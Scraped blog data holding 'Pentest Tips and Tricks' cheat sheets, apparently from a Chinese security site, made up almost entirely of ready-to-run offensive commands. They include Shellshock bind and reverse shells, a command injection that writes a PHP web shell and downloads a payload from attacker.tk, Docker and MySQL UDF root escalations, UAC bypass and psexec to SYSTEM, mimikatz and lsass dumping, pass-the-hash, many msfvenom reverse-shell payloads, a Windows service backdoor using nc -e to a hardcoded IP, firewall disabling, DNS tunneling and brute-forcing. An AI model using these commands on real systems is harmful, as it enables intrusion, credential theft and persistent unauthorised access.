tor service port 80# /etc/tor/torrcSocksPolicy accept 127.0.0.1SocksPolicy accept 192.168.0.0/16Log notice file /var/log/tor/notices.logRunAsDaemon 1HiddenServiceDir /var/lib/tor/ssh_hidden_service/HiddenServicePort 80 127.0.0.1:22PublishServerDescriptor 0$ /etc/init.d/tor start$ cat /var/lib/tor/ssh_hidden_service/hostname3l5zstvt1zk5jhl662.onion# ssh connect from client$ apt-get install torsocks$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80 DNS brute forcing with fierce123# http://ha.ckers.org/fierce/$ ./fierce.pl -dns example.com$ ./fierce.pl –dns example.com –wordlist myWordList.txt Metagoofil metadata gathering tool1234# http://www.edge-security.com/metagoofil.php#automate search engine document retrieval and analysis. It also has the capability to provide MAC# addresses, username listings, and more$ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html A best NMAP scan strategy12345678910111213141516171819202122232425262728# A best nmap scan strategy for networks of all sizes# Host Discovery - Generate Live Hosts List$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24$ grep &quot;Status: Up&quot; Discovery.gnmap | cut -f 2 -d &apos; &apos; &gt; LiveHosts.txt# Port Discovery - Most Common Ports# http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt# Port Discovery - Full Port Scans (UDP is very slow)$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt# Print TCP\\UDP Ports$ grep &quot;open&quot; FullTCP|cut -f 1 -d &apos; &apos; | sort -nu | cut -f 1 -d &apos;/&apos; |xargs | sed &apos;s/ /,/g&apos;|awk &apos;&#123;print &quot;T:&quot;$0&#125;&apos;$ grep &quot;open&quot; FullUDP|cut -f 1 -d &apos; &apos; | sort -nu | cut -f 1 -d &apos;/&apos; |xargs | sed &apos;s/ /,/g&apos;|awk &apos;&#123;print &quot;U:&quot;$0&#125;&apos;# Detect Service Version$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt# Operating System Scan$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt# OS and Service Detect$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt Nmap – Techniques for Avoiding Firewalls1234567891011121314151617181920212223# fragmentation$ nmap -f# change default MTU size number must be a multiple of 8 (8,16,24,32 etc)$ nmap --mtu 24# Generates a random number of decoys$ nmap -D RND:10 [target]# Manually specify the IP addresses of the decoys$ nmap -D decoy1,decoy2,decoy3 etc.# Idle Zombie Scan, first t need to find zombie ip$ nmap -sI [Zombie IP] [Target IP]# Source port number specification$ nmap --source-port 80 IP# Append Random Data to scan packages$ nmap --data-length 25 IP# MAC Address Spoofing, generate different mac for host pc$ nmap --spoof-mac Dell/Apple/3Com IP Exploit servers to Shellshock(利用服务器的shellshock)12345678910111213# A tool to find and exploit servers vulnerable to Shellshock# https://github.com/nccgroup/shocker$ ./shocker.py -H 192.168.56.118 --command &quot;/bin/cat /etc/passwd&quot; -c /cgi-bin/status --verbose# cat file$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123; :;&#125;; echo \\$(&lt;/etc/passwd)\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n&quot; | nc 192.168.56.118 80# bind shell$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n&quot; | nc 192.168.56.118 80# reverse Shell$ nc -l -p 443$ echo &quot;HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n&quot; | nc 192.168.56.118 80 Root with Docker(以root的身份运行docker)12345678910111213141516171819202122232425262728# get root with docker# user must be in docker groupek@victum:~/docker-test$ iduid=1001(ek) gid=1001(ek) groups=1001(ek),114(docker)ek@victum:~$ mkdir docker-testek@victum:~$ cd docker-testek@victum:~$ cat &gt; DockerfileFROM debian:wheezyENV WORKDIR /stuffRUN mkdir -p $WORKDIRVOLUME [ $WORKDIR ]WORKDIR $WORKDIR&lt;&lt; EOFek@victum:~$ docker build -t my-docker-image .ek@victum:~$ docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c \\&apos;cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh&apos;./shwhoami# rootek@victum:~$ docker run -v /etc:/stuff -t my-docker-image /bin/sh -c &apos;cat /stuff/shadow&apos; Tunneling Over DNS to Bypass Firewall123456789101112131415161718# Tunneling Data and Commands Over DNS to Bypass Firewalls# dnscat2 supports &quot;download&quot; and &quot;upload&quot; commands for getting files (data and programs) to and from # the victim’s host.# server (attacker)$ apt-get update$ apt-get -y install ruby-dev git make g++$ gem install bundler$ git clone https://github.com/iagox86/dnscat2.git$ cd dnscat2/server$ bundle install$ ruby ./dnscat2.rbdnscat2&gt; New session established: 16059dnscat2&gt; session -i 16059# client (victum)# https://downloads.skullsecurity.org/dnscat2/# https://github.com/lukebaggett/dnscat2-powershell$ dnscat --host &lt;dnscat server_ip&gt; Compile Assemble code(编译汇编代码)12345$ nasm -f elf32 simple32.asm -o simple32.o$ ld -m elf_i386 simple32.o simple32$ nasm -f elf64 simple.asm -o simple.o$ ld simple.o -o simple Pivoting to Internal Network Via Non Interactive Shell(通过非交互式外壳枢转到内部网络)1234567891011121314# generate ssh key with shell$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=whoami&quot;$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \\&quot;\\&quot; &quot;$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot;# add tempuser at attacker ps$ useradd -m tempuser$ mkdir /home/tempuser/.ssh &amp;&amp; chmod 700 /home/tempuser/.ssh$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot; &gt; /home/tempuser/.ssh/authorized_keys$ chmod 700 /home/tempuser/.ssh/authorized_keys$ chown -R tempuser:tempuser /home/tempuser/.ssh# create reverse ssh shell$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@&lt;attacker_ip&gt;&quot; Patator is a multi-purpose brute-forcer1234567# git clone https://github.com/lanjelot/patator.git /usr/share/patator# SMTP bruteforce$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst$ patator smtp_login host=192.168.17.129 helo=&apos;ehlo 192.168.17.128&apos; user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=&apos;incorrect password or account name&apos; Metasploit Web terminal via Gotty12345678$ service postgresql start$ msfdb init$ apt-get install golang$ mkdir /root/gocode$ export GOPATH=/root/gocode$ go get github.com/yudai/gotty$ gocode/bin/gotty -a 127.0.0.1 -w msfconsole# open in browser http://127.0.0.1:8080 Get full shell with POST RCE1234567891011attacker:~$ curl -i -s -k -X &apos;POST&apos; --data-binary $&apos;IP=%3Bwhoami&amp;submit=submit&apos; &apos;http://victum.tk/command.php&apos;attacker:~$ curl -i -s -k -X &apos;POST&apos; --data-binary $&apos;IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&amp;submit=submit&apos; &apos;http://victum.tk/command.php&apos;attacker:~$ curl http://victum.tk/shell.php?cmd=id# download reverse shell to server (phpshell.php)http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27# run nc and execute phpshell.phpattacker:~$ nc -nvlp 1337 Exiftool - Read and write meta information in files(读/写文件的元数据)123456$ wget http://www.sno.phy.queensu.ca/~phil/exiftool/Image-ExifTool-10.13.tar.gz$ tar xzf Image-ExifTool-10.13.tar.gz$ cd Image-ExifTool-10.13$ perl Makefile.PL$ make$ ./exiftool main.gif Get SYSTEM with Admin reverse_shell on Win71234567891011121314151617181920212223242526272829303132333435363738394041msfvenom –p windows/shell_reverse_tcp LHOST=192.168.56.102 –f exe &gt; danger.exe#show account settingsnet user &lt;login&gt;# download psexec to kalihttps://technet.microsoft.com/en-us/sysinternals/bb897553.aspx# upload psexec.exe file onto the victim machine with powershell scriptecho $client = New-Object System.Net.WebClient &gt; script.ps1echo $targetlocation = &quot;http://192.168.56.102/PsExec.exe&quot; &gt;&gt; script.ps1echo $client.DownloadFile($targetlocation,&quot;psexec.exe&quot;) &gt;&gt; script.ps1powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1# upload danger.exe file onto the victim machine with powershell scriptecho $client = New-Object System.Net.WebClient &gt; script2.ps1echo $targetlocation = &quot;http://192.168.56.102/danger.exe&quot; &gt;&gt; script2.ps1echo $client.DownloadFile($targetlocation,&quot;danger.exe&quot;) &gt;&gt; script2.ps1powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1# UAC bypass from precompiled binaries:https://github.com/hfiref0x/UACME# upload https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe to victim pc with powershellecho $client = New-Object System.Net.WebClient &gt; script2.ps1echo $targetlocation = &quot;http://192.168.56.102/Akagi64.exe&quot; &gt;&gt; script3.ps1echo $client.DownloadFile($targetlocation,&quot;Akagi64.exe&quot;) &gt;&gt; script3.ps1powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1# create listener on kalinc -lvp 4444# Use Akagi64 to run the danger.exe file with SYSTEM privilegesAkagi64.exe 1 C:\\Users\\User\\Desktop\\danger.exe# create listener on kalinc -lvp 4444# The above step should give us a reverse shell with elevated privileges# Use PsExec to run the danger.exe file with SYSTEM privilegespsexec.exe –i –d –accepteula –s danger.exe Get SYSTEM with Standard user reverse_shell on Win712345678910111213141516171819202122https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.htmlhttps://www.exploit-db.com/exploits/37049/# check the list of patches applied on the target machine# to get the list of Hotfixes installed, type in the following command.wmic qfe getwmic qfe | find &quot;3057191&quot;# Upload compile exploit to victim machine and run ithttps://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe# by default exploite exec cmd.exe with SYSTEM privileges, we need to change source code to run danger.exe# https://github.com/hfiref0x/CVE-2015-1701 download it and navigate to the file &quot;main.c&quot;# dump clear text password of the currently logged in user using wce.exehttp://www.ampliasecurity.com/research/windows-credentials-editor/wce -w# dump hashes of other users with pwdump7http://www.heise.de/download/pwdump.html# we can try online hash cracking tools such crackstation.net Generate our own dic file based on the website content(根据网站内容生成我们自己的DIC文件)12$ cewl -m 4 -w dict.txt http://site.url$ john --wordlist=dict.txt --rules --stdout Bruteforce DNS records using Nmap12$ nmap --script dns-brute --script-args dns-brute.domain=foo.com,dns-brute.threads=6,dns-brute.hostlist=./hostfile.txt,newtargets -sS -p 80$ nmap --script dns-brute www.foo.com Identifying a WAF with Nmap(使用nmap识别waf)123$ nmap -p 80,443 --script=http-waf-detect 192.168.56.102$ nmap -p 80,443 --script=http-waf-fingerprint 192.168.56.102$ wafw00f www.example.com MS08-067 - without the use of Metasploit123$ nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205$ searchsploit ms08-067$ python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1 Nikto scan with SQUID proxy1$ nikto -useproxy http://squid_ip:3128 -h http://target_ip Hijack a binary’s full path in bash to exec your own code(劫持一个二进制的完整路径，以执行自己的代码)1234$ function /usr/bin/foo () &#123; /usr/bin/echo &quot;It works&quot;; &#125;$ export -f /usr/bin/foo$ /usr/bin/fooIt works Local privilege escalation through MySQL run with root privileges(本地特权升级通过MySQL运行root权限)12345678910111213141516171819# Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)$ wget 0xdeadbeef.info/exploits/raptor_udf2.c$ gcc -g -c raptor_udf2.c$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lcmysql -u root -pmysql&gt; use mysql;mysql&gt; create table foo(line blob);mysql&gt; insert into foo values(load_file(&apos;/home/user/raptor_udf2.so&apos;));mysql&gt; select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf2.so&apos;;mysql&gt; create function do_system returns integer soname &apos;raptor_udf2.so&apos;;mysql&gt; select * from mysql.func;mysql&gt; select do_system(&apos;echo &quot;root:passwd&quot; | chpasswd &gt; /tmp/out; chown user:user /tmp/out&apos;);user:~$ su -Password:user:~# whoamirootroot:~# iduid=0(root) gid=0(root) groups=0(root) Bruteforce SSH login with patator(通过patator爆破ssh登陆)1root:~# patator ssh_login host=192.168.0.18 user=FILE0 password=FILE1 0=word.txt 1=word.txt -x ignore:mesg=&apos;Authentication failed.&apos; Using LD_PRELOAD to inject features to programs123$ wget https://github.com/jivoi/pentest/ldpreload_shell.c$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so$ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft Exploit the OpenSSH User Enumeration Timing Attack123# https://github.com/c0r3dump3d/osueta$ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes$ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes –dos no -L userfile.txt Create a TCP circuit through validly formed HTTP requests with ReDuh123456789101112131415161718192021# https://github.com/sensepost/reDuh# step 1# upload reDuh.jsp to victim server$ http://192.168.10.50/uploads/reDuh.jsp# step 2# run reDuhClient on attacker$ java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp# step 3# connecting to management port with nc$ nc -nvv 127.0.0.1 1010# step 4# forward localport to remote port with tunnel[createTunnel] 7777:172.16.0.4:3389# step 5# connect to localhost with rdp$ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777","categories":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}],"tags":[],"keywords":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}]},{"title":"Pentest Tips and Tricks01","slug":"Pentest-Tips-and-Tricks01","date":"2017-06-25T09:31:53.000Z","updated":"2017-06-25T09:49:52.845Z","comments":true,"path":"2017/06/25/Pentest-Tips-and-Tricks01/","link":"","permalink":"http://airs-sec.com/2017/06/25/Pentest-Tips-and-Tricks01/","excerpt":"渗透测试常用技巧和窍门第一部分，来自国外的EK， 看原文的走这。 Pentest Tips and Tricks #01(渗透测试的技巧和窍门)Nmap Full Web Vulnerable Scancd /usr/share/nmap/scripts/ wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz nmap -sS -sV --script=vulscan/vulscan.nse target nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target nmap -sV --script=vuln target nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target","text":"渗透测试常用技巧和窍门第一部分，来自国外的EK， 看原文的走这。 Pentest Tips and Tricks #01(渗透测试的技巧和窍门)Nmap Full Web Vulnerable Scancd /usr/share/nmap/scripts/ wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz nmap -sS -sV --script=vulscan/vulscan.nse target nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target nmap -sV --script=vuln target nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target Dirb Dir Bruteforce(目录爆破)dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt Nikto web server scanner(Niktoweb服务器扫描)nikto -C all -h http://IP WordPress Scanner(wordpress扫描)git clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan ./wpscan –url http://IP/ –enumerate p HTTP Fingerprinting(HTTP指纹识别)wget http://www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zip cd httprint_301/linux/ ./httprint -h http://IP -s signatures.txt SKIP Fish Scannerskipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP Nmap Ports Scan1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys) 1)decoy- masqurade nmap -D RND:10 [target] (Generates a random number of decoys) 2)fargement 3)data packed – like orginal one not scan packet 4)use auxiliary/scanner/ip/ipidseq for find zombie ip in network to use them to scan — nmap -sI ip target 5)nmap –source-port 53 target nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target ( Randomize scan form diff IP) nmap -Pn -T2 -sV –randomize-hosts IP1,IP2 nmap –script smb-check-vulns.nse -p445 target (using NSE scripts) nmap -sU -P0 -T Aggressive -p123 target (Aggresive Scan T1-T5) nmap -sA -PN -sN target nmap -sS -sV -T5 -F -A -O target (version detection) nmap -sU -v target (Udp) nmap -sU -P0 (Udp) nmap -sC 192.168.31.10-12 (all scan default) NC Scanningnc -v -w 1 target -z 1-1000 for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done Unicornscanus -H -msf -Iv 192.168.56.101 -p 1-65535 us -H -mU -Iv 192.168.56.101 -p 1-65535 -H resolve hostnames during the reporting phase -m scan mode (sf - tcp, U - udp) -Iv - verbose Xprobe2 OS fingerprinting(指纹识别)xprobe2 -v -p tcp:80:open IP Samba Enumeration(samba枚举)nmblookup -A target smbclient //MOUNT/share -I target -N rpcclient -U &quot;&quot; target enum4linux target SNMP Enumeration(SNMP枚举)snmpget -v 1 -c public IP snmpwalk -v 1 -c public IP snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP Windows Useful cmdsnet localgroup Users net localgroup Administrators search dir/s *.doc system(&quot;start cmd.exe /k $cmd&quot;) sc create microsoft_update binpath=&quot;cmd /K start c:\\nc.exe -d ip-of-hacker port -e cmd.exe&quot; start= auto error= ignore /c C:\\nc.exe -e c:\\windows\\system32\\cmd.exe -vv 23.92.17.103 7779 mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; Procdump.exe -accepteula -ma lsass.exe lsass.dmp mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; C:\\temp\\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits C:\\temp\\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits PuTTY Link tunnel(putty链接隧道)Forward remote port to local address plink.exe -P 22 -l root -pw &quot;1234&quot; -R 445:127.0.0.1:445 IP Meterpreter portfwd# https://www.offensive-security.com/metasploit-unleashed/portfwd/ # forward remote port to local address meterpreter &gt; portfwd add –l 3389 –p 3389 –r 172.16.194.141 kali &gt; rdesktop 127.0.0.1:3389 Enable RDP Access(激活rdp访问)reg add &quot;hklm\\system\\currentcontrolset\\control\\terminal server&quot; /f /v fDenyTSConnections /t REG_DWORD /d 0 netsh firewall set service remoteadmin enable netsh firewall set service remotedesktop enable Turn Off Windows Firewall(关闭windows防火墙)netsh firewall set opmode disable Meterpreter VNC\\RDPa # https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/ run getgui -u admin -p 1234 run vnc -p 5043 Add New user in Windowsnet user test 1234 /add net localgroup administrators test /add Mimikatz usegit clone https://github.com/gentilkiwi/mimikatz.git privilege::debug sekurlsa::logonPasswords full Passing the Hashgit clone https://github.com/byt3bl33d3r/pth-toolkit pth-winexe -U hash //IP cmd or apt-get install freerdp-x11 xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP or meterpreter &gt; run post/windows/gather/hashdump Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c::: msf &gt; use exploit/windows/smb/psexec msf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp msf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c msf exploit(psexec) &gt; exploit meterpreter &gt; shell Hashcat password crackinghashcat -m 400 -a 0 hash /root/rockyou.txt ## Netcat examples c:&gt; nc -l -p 31337 #nc 192.168.0.10 31337 c:&gt; nc -v -w 30 -p 31337 -l &lt; secret.txt #nc -v -w 2 192.168.0.10 31337 &gt; secret.txt Banner grabbing with NCnc 192.168.0.10 80 GET / HTTP/1.1 Host: 192.168.0.10 User-Agent: Mozilla/4.0 Referrer: www.example.com &lt;enter&gt; &lt;enter&gt; Window reverse shellc:&gt;nc -Lp 31337 -vv -e cmd.exe nc 192.168.0.10 31337 c:&gt;nc example.com 80 -e cmd.exe nc -lp 80 nc -lp 31337 -e /bin/bash nc 192.168.0.10 31337 nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000 Find SUID\\SGID root files# Find SUID root files find / -user root -perm -4000 -print # Find SGID root files: find / -group root -perm -2000 -print # Find SUID and SGID files owned by anyone: find / -perm -4000 -o -perm -2000 -print # Find files that are not owned by any user: find / -nouser -print # Find files that are not owned by any group: find / -nogroup -print # Find symlinks and what they point to: find / -type l -ls Python shellpython -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos; Python\\Ruby\\PHP HTTP Serverpython2 -m SimpleHTTPServer python3 -m http.server ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 8888, :DocumentRoot =&gt; Dir.pwd).start&quot; php -S 0.0.0.0:8888 Get PIDs of processfuser -nv tcp 80 fuser -k -n tcp 80 Hydra rdp Bruteforcehydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp Mount Remote Windows Sharesmbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw Compiling Exploit in Kali(在kali上编译漏洞)gcc -m32 -o output32 hello.c (32 bit) gcc -m64 -o output hello.c (64 bit) Compiling Windows Exploits on Kali(在kali上编译windows漏洞)wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download wine mingw-get-setup.exe select mingw32-base cd /root/.wine/drive_c/windows wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip cd /root/.wine/drive_c/MinGW/bin wine gcc -o ability.exe /tmp/exploit.c -lwsock32 wine ability.exe NASM Commandsnasm -f bin -o payload.bin payload.asm nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload SSH Pivotingssh -D 127.0.0.1:1080 -p 22 user@IP Add socks4 127.0.0.1 1080 in /etc/proxychains.conf proxychains commands target SSH Pivoting from One Network to Anotherssh -D 127.0.0.1:1080 -p 22 user1@IP1 Add socks4 127.0.0.1 1080 in /etc/proxychains.conf proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2 Add socks4 127.0.0.1 1081 in /etc/proxychains.conf proxychains commands target Pivoting Using metasploitroute add X.X.X.X 255.255.255.0 1 use auxiliary/server/socks4a run proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E or # https://www.offensive-security.com/metasploit-unleashed/pivoting/ meterpreter &gt; ipconfig IP Address : 10.1.13.3 meterpreter &gt; run autoroute -s 10.1.13.0/24 meterpreter &gt; run autoroute -p 10.1.13.0 255.255.255.0 Session 1 meterpreter &gt; Ctrl+Z msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec msf exploit(psexec) &gt; set RHOST 10.1.13.2 msf exploit(psexec) &gt; exploit meterpreter &gt; ipconfig IP Address : 10.1.13.2 Exploit-DB search using CSV Filegit clone https://github.com/offensive-security/exploit-database.git cd exploit-database ./searchsploit –u ./searchsploit apache 2.2 ./searchsploit &quot;Linux Kernel&quot; cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep &quot;&lt;|&lt;=&quot; | sort -k3 MSF Payloadsmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &gt; system.exe msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &gt; exploit.php msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 --platform win -f asp -o file.asp msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b &quot;\\x00&quot; -a x86 --platform win -f c MSF Linux Reverse Meterpreter Binarymsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 --platform linux -o shell MSF Reverse Shell (C Shellcode)msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b &quot;\\x00\\x0a\\x0d&quot; -a x86 --platform win -f c MSF Reverse Shell Python Scriptmsfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py MSF Reverse ASP Shellmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp MSF Reverse Bash Shellmsfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh MSF Reverse PHP Shellmsfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.php add &lt;?php at the beginning perl -i~ -0777pe&apos;s/^/&lt;?php \\n/&apos; shell.php MSF Reverse Win Binmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 --platform win -o shell.exe Linux Security Commands# find programs with a set uid bit find / -uid 0 -perm -4000 # find things that are world writable find / -perm -o=w # find names with dots and spaces, there shouldn’t be any find / -name &quot; &quot; -print find / -name &quot;..&quot; -print find / -name &quot;. &quot; -print find / -name &quot; &quot; -print # find files that are not owned by anyone find / -nouser # look for files that are unlinked lsof +L1 # get information about procceses with open ports lsof -i # look for weird things in arp arp -a # look at all accounts including AD getent passwd # look at all groups and membership including AD getent group # list crontabs for all users including AD for user in $(getent passwd|cut -f1 -d:); do echo &quot;### Crontabs for $user ####&quot;; crontab -u $user -l; done # generate random passwords cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#$%^&amp;*()_+{}|:&lt;&gt;?=’|fold -w 12| head -n 4 # find all immutable files, there should not be any find . | xargs -I file lsattr -a file 2&gt;/dev/null | grep ‘^….i’ # fix immutable files chattr -i file Win Buffer Overflow Exploit Commands(windows缓冲区溢出漏洞命令)msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b &quot;\\x00&quot; -f c msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b &quot;\\x00&quot; -f c COMMONLY USED BAD CHARACTERS: \\x00\\x0a\\x0d\\x20 For http request \\x00\\x0a\\x0d\\x20\\x1a\\x2c\\x2e\\3a\\x5c Ending with (0\\n\\r_) # Useful Commands: pattern create pattern offset (EIP Address) pattern offset (ESP Address) add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode ) !pvefindaddr pattern_create 5000 !pvefindaddr suggest !pvefindaddr modules !pvefindaddr nosafeseh !mona config -set workingfolder C:\\Mona\\%p !mona config -get workingfolder !mona mod !mona bytearray -b &quot;\\x00\\x0a&quot; !mona pc 5000 !mona po EIP !mona suggest SEH - Structured Exception Handling(结构化异常处理)# https://en.wikipedia.org/wiki/Microsoftspecific_exception_handling_mechanisms#SEH !mona suggest !mona nosafeseh nseh=&quot;\\xeb\\x06\\x90\\x90&quot; (next seh chain) iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN) ROP (DEP)# https://en.wikipedia.org/wiki/Return-oriented_programming # https://en.wikipedia.org/wiki/Data_Execution_Prevention !mona modules !mona ropfunc -m *.dll -cpb &quot;\\x00\\x09\\x0a&quot; !mona rop -m *.dll -cpb &quot;\\x00\\x09\\x0a&quot; (auto suggest) ASLR - Address space layout randomization(ASLR地址空间布局随机化)# https://en.wikipedia.org/wiki/Address_space_layout_randomization !mona noaslr EGG Hunter techniques# https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/ # http://www.fuzzysecurity.com/tutorials/expDev/4.html !mona jmp -r esp !mona egg -t lxxl 